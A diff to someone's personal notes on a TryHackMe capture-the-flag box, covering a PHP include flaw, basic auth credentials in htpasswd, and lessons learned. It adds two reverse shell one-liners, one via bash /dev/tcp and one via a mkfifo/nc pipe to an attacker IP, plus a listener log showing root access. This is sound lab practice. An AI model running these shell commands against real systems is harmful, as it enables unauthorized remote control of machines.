@@ -544,6 +544,25 @@ include($filter); <--- This will insert the contents of $filter. Intended for ot
 ...
 ```
 
+shell.sh:
+```
+bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
+```
+Didn't work,
+but this did:
+```
+mkfifo /tmp/lhennp; nc 10.14.21.85 4242 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp
+```
+Would like to figure out why.
+
+```
+Ncat: Connection from 10.10.20.193:58888.
+pwd
+/home/server-management/Documents
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
 
 # Questions
 1. What is the user flag?
@@ -554,5 +573,11 @@ THM{xxxxxxxxxxxxxxxxxxxxxxx}
 Notes:
 Need to find a automated way to enumerate possible links in a website.
 Need to be more diligent in writing down things. I needed a writeup to remind
-me of basic auth as a path forward. Didn't know that creds were stored in htpasswd
-, now I do.
+me of basic auth as a path forward. Didn't know that creds were stored in htpasswd,
+ keep that in mind for later.
+
+All in all, the box matched my skill level quite well. I needed two nudges,
+one for the referer variable and one for the basic auth creds.
+
+The referer I should have figured out myself, if I just was more diligent in looking
+through the code.
